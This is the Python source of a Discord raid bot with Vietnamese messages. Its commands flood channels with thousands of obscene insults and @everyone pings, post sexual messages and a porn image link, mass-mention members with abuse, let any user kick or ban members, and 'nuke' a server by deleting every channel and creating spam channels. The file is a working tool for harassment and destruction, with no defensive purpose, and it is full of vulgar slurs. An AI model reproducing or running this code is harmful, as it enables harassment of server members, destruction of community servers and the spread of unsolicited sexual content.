import discord
from discord.ext import commands
import asyncio
import random
import os
from flask import Flask
import threading

# ============== FLASK DUMMY ĐỂ RENDER KHÔNG KILL ==============
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot Slash Command / thuần - Spam Sex 30000 - Hacker Minh Nhựt"

# ============== DISCORD BOT THUẦN SLASH / ==============
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)  # prefix vẫn giữ để sync, nhưng không dùng lệnh !

insults = ["Đụ má mày @{} ngu vl", "Cặc lồn mẹ mày {} con chó", "@everyone lồn mẹ server này"]
sex_chat = ["Muốn bú cặc không @{}?", "Lồn mày ướt chưa? Tao gửi ảnh sex đây", "Spam địt nhau @everyone", "Ai dám chơi thì tag @here"]
porn_images = ["https://i.imgur.com/NSp1v7K.jpeg"]  # thay link sex thật nếu mày có

@bot.event
async def on_ready():
    print(f"Bot SLASH COMMAND / ONLINE MÀU XANH - {bot.user}")
    print("Gõ /help để xem tất cả lệnh")

# ==================== TẤT CẢ LỆNH / ====================

@bot.tree.command(name="help", description="Xem tất cả lệnh slash /")
async def help_cmd(interaction):
    await interaction.response.send_message(
        "**TẤT CẢ LỆNH SLASH /** (Ai cũng dùng được):\n"
        "/spam30000 → Spam 30000 lần cặc lồn\n"
        "/sex [số lần] → Spam chat sex\n"
        "/porn [số lần] → Gửi ảnh sex\n"
        "/kick @user → Kick người\n"
        "/ban @user → Ban người\n"
        "/mass [số lần] → Mass mention chửi\n"
        "/clear [số] → Xóa tin nhắn\n"
        "/nuke → Nuke server (nguy hiểm)\n"
        "Gõ lệnh thoải mái, không cần quyền admin!", ephemeral=False)

@bot.tree.command(name="spam30000", description="Spam 30000 lần cặc lồn")
async def spam30000_slash(interaction):
    await interaction.response.send_message("Bắt đầu spam 30000 lần...", ephemeral=True)
    for _ in range(100):
        for _ in range(300):
            try:
                await interaction.channel.send(random.choice(insults).format("@everyone"))
                await asyncio.sleep(0.3)
            except:
                await asyncio.sleep(5)
        await asyncio.sleep(3)
    await interaction.followup.send("Spam 30000 lần xong! Server sập mẹ nó!", ephemeral=True)

@bot.tree.command(name="sex", description="Spam chat sex")
async def sex_slash(interaction, times: int = 30):
    await interaction.response.send_message("Đang spam sex...", ephemeral=True)
    for _ in range(times):
        try:
            await interaction.channel.send(random.choice(sex_chat).format("@everyone"))
            await asyncio.sleep(0.5)
        except:
            await asyncio.sleep(4)
    await interaction.followup.send("Spam sex xong!", ephemeral=True)

@bot.tree.command(name="porn", description="Gửi ảnh sex")
async def porn_slash(interaction, times: int = 8):
    await interaction.response.send_message(f"Gửi {times} ảnh sex...", ephemeral=True)
    for _ in range(times):
        try:
            await interaction.channel.send(random.choice(porn_images))
            await asyncio.sleep(1.2)
        except:
            await asyncio.sleep(3)
    await interaction.followup.send("Gửi ảnh sex xong!", ephemeral=True)

@bot.tree.command(name="kick", description="Kick người (ai cũng dùng được)")
async def kick_slash(interaction, member: discord.Member):
    await member.kick()
    await interaction.response.send_message(f"Đã kick {member.mention} mẹ nó rồi!", ephemeral=False)

@bot.tree.command(name="ban", description="Ban người (ai cũng dùng được)")
async def ban_slash(interaction, member: discord.Member):
    await member.ban()
    await interaction.response.send_message(f"Đã ban {member.mention} cặc lồn!", ephemeral=False)

@bot.tree.command(name="mass", description="Mass mention chửi")
async def mass_slash(interaction, times: int = 15):
    await interaction.response.send_message("Mass mention đang chạy...", ephemeral=True)
    members = [m.mention for m in interaction.guild.members if not m.bot]
    for _ in range(times):
        try:
            tag = " ".join(random.sample(members, min(10, len(members))))
            await interaction.channel.send(f"{tag} Đụ lồn mẹ chúng mày @everyone")
            await asyncio.sleep(0.7)
        except:
            await asyncio.sleep(4)

@bot.tree.command(name="clear", description="Xóa tin nhắn")
async def clear_slash(interaction, amount: int = 50):
    await interaction.response.send_message("Đang xóa tin nhắn...", ephemeral=True)
    await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Đã xóa {amount} tin nhắn!", ephemeral=True)

@bot.tree.command(name="nuke", description="Nuke server (ai cũng dùng được - nguy hiểm vl)")
async def nuke_slash(interaction):
    await interaction.response.send_message("BẮT ĐẦU NUKE SERVER... Server sắp chết mẹ nó!", ephemeral=True)
    for ch in list(interaction.guild.channels):
        try:
            await ch.delete()
            await asyncio.sleep(0.6)
        except:
            pass
    for i in range(25):
        try:
            await interaction.guild.create_text_channel(f"spam-lồn-{i}")
            await asyncio.sleep(1)
        except:
            pass
    await interaction.followup.send("NUKE HOÀN TẤT! Server thành đống cặc lồn!", ephemeral=True)

# ============== CHẠY FLASK + BOT ==============
def run_flask():
    app.run(host="0.0.0.0", port=5000)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(os.getenv("TOKEN"))